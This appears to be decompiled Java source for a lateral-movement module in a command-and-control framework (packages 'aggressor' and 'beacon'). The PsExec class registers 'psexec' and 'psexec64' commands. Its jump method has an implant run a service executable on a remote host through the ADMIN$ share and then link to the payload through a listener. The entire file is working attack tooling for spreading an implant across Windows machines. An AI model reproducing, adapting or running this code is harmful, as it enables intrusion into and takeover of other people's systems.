package beacon.remoteexploits;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.BeaconRemoteExploits;
import beacon.TaskBeacon;
import common.ListenerUtils;
import common.ScListener;

public class PsExec implements BeaconRemoteExploits.RemoteExploit {
   protected String arch;
   protected AggressorClient client;

   public PsExec(AggressorClient var1, String var2) {
      this.client = var1;
      this.arch = var2;
      if ("x86".equals(var2)) {
         DataUtils.getBeaconRemoteExploits(var1.getData()).register("psexec", var2, "Use a service to run a Service EXE artifact", this);
      } else {
         DataUtils.getBeaconRemoteExploits(var1.getData()).register("psexec64", var2, "Use a service to run a Service EXE artifact", this);
      }

   }

   public void jump(String var1, String var2, String var3) {
      ScListener var4 = ListenerUtils.getListener(this.client, var3);
      TaskBeacon var5 = new TaskBeacon(this.client, new String[]{var1});
      var5.PsExec(var1, var2, this.arch, var4, "ADMIN$");
      var5.linkToPayloadRemote(var4, var2);
   }
}
